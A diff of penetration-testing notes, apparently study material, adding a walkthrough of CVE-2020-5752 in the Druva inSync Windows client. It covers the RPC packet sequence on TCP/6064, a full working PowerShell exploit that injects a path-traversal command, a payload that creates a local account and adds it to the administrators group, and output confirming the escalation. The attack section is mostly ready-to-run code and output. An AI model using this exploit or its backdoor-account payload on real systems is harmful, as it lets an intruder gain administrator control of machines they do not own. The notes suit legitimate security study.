@@ -692,14 +692,73 @@ wmic product get name.version,vendor
 * Target is vulnerable as it runs Remote Procedure Call (RPC) server on TCP/6064 with SYSTEM privileges from localhost only.
   * RPC is mechanism that allows a process to expose functions (procedures) over a network allowing other machines to call them.
 * Druva InSync exposed a procedure that allows anyone to request execution of any command.
-* Original exploit published [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html).
 * Understand how to talk to TCP/6064.
 1. Hello Packet -> RPC server.
-2. Remote Procedure ID -> RPC Server.
+   * `inSync PHC RPCW[v0002]`
+   * Packet contains a fixed string.
+3. Remote Procedure ID -> RPC Server.
+   * `0x00000005`
    * Execute vulnerable procedure 5.
 4. Command Length -> RPC Server.
-5. Command String -> RPC Server.
-* 
+   * `62`
+   * Set length of command.
+6. Command String -> RPC Server.
+   * `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`
+   * Set command string to be executed.
+* Original exploit published [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html).
+* Full exploit code.
+```
+# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
+# Date: 2020-12-03
+# Exploit Author: 1F98D
+# Original Author: Matteo Malvica
+# Vendor Homepage: druva.com
+# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
+# Version: 6.6.3
+# Tested on: Windows 10 (x64)
+# CVE: CVE-2020-5752
+# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
+# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.
+
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd1 SimplePass123 /add & net localgroup administrators pwnd1 /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+* Default payload creates user called `pwnd` but does not assign administrative privileges.
+* Change payload to add created user to administrators group.
+```
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+```
+* Verify that `pwnd` user exists and is member of administrators group.
+```
+net user pwnd
+User name                    pwnd
+Full Name
+Account active               Yes
+[...]
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+```
+* Run command prompt as administrator.
+  * Use `pwnd` credentials.
 # Tools of the Trade
 
 
